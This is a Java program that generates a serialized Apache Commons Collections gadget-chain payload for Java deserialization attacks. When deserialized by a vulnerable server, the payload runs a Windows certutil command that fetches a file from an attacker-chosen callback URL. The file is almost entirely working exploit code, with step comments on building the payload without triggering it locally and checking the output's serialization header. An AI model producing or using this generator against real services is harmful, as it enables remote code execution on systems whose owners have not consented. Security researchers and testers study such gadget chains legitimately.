import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.*;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.keyvalue.TiedMapEntry;

import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class MakeHTTPOC {
    public static void main(String[] args) throws Exception {
        if (args.length != 2) {
            System.out.println("Usage: java -cp .;jar\\commons-collections-3.2.2.jar MakeHTTPOC <callback-url> <output.bin>");
            return;
        }
        
        String callbackUrl = args[0];
        String outfile = args[1];
        
        // Windows built-in HTTP GET command
        String cmd = "certutil -urlcache -split -f " + callbackUrl + " C:\\Windows\\Temp\\poc";
        
        // Step 1: Build the real command execution chain
        Transformer[] chain = new Transformer[] {
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod", 
                new Class[]{String.class, Class[].class}, 
                new Object[]{"getRuntime", new Class[0]}),
            new InvokerTransformer("invoke", 
                new Class[]{Object.class, Object[].class}, 
                new Object[]{null, new Object[0]}),
            new InvokerTransformer("exec", 
                new Class[]{String.class}, 
                new Object[]{cmd})
        };
        Transformer realFactory = new ChainedTransformer(chain);
        
        // Step 2: Use a DUMMY factory during local HashMap construction
        // This prevents the payload from firing on YOUR machine while you build it
        Transformer dummyFactory = new ConstantTransformer("dummy");
        Map lazyMap = LazyMap.decorate(new HashMap(), dummyFactory);
        
        // Step 3: Put the TiedMapEntry into a HashMap
        TiedMapEntry entry = new TiedMapEntry(lazyMap, "unused");
        HashMap hashMap = new HashMap();
        hashMap.put(entry, "value");  // Safe: dummyFactory just returns "dummy"
        
        // Step 4: Clear the LazyMap so the server has to re-evaluate it during deserialization
        lazyMap.clear();
        
        // Step 5: Swap in the REAL factory via reflection
        // LazyMap is in commons-collections (NOT java.base), so setAccessible works
        Field factoryField = LazyMap.class.getDeclaredField("factory");
        factoryField.setAccessible(true);
        factoryField.set(lazyMap, realFactory);
        
        // Step 6: Serialize
        try (ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(outfile))) {
            oos.writeObject(hashMap);
        }
        
        // Verify
        byte[] header = new byte[4];
        try (FileInputStream fis = new FileInputStream(outfile)) {
            fis.read(header);
        }
        if (header[0] == (byte)0xAC && header[1] == (byte)0xED) {
            System.out.println("[+] SUCCESS: Valid serialized payload");
            System.out.println("[+] File: " + outfile + " (" + new File(outfile).length() + " bytes)");
            System.out.println("[+] Will execute: " + cmd);
        } else {
            System.out.println("[!] FAILED: Header is " + String.format("%02X%02X%02X%02X", header[0], header[1], header[2], header[3]));
        }
    }
}
